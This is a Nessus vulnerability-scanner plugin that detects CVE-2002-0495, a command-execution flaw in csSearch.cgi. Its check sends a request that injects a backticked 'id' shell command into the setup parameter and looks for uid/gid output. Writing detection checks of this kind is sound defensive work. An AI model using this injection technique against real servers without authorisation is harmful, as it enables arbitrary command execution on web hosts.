#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10924);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2002-0495");
 script_bugtraq_id(4368);
 script_osvdb_id(761);

 script_name(english:"csSearch csSearch.cgi setup Parameter Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/csSearch.cgi");
 
 script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host has a command execution
vulnerability." );
 script_set_attribute( attribute:"description", value:
"The version of csSearch running on the remote host has a command
execution vulnerability.  Input to the 'print' parameter of
'csSearch.cgi' is not properly sanitized.  A remote attacker could
exploit this by executing arbitrary system commands with the
privileges of the web server." );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from the web server."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/03/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/03/25");
 script_cvs_date("$Date: 2011/03/15 19:22:14 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2002-2011 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

http_check_remote_code (
			check_request:"/csSearch.cgi?command=savesetup&setup=print%20`id`",
			extra_check:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
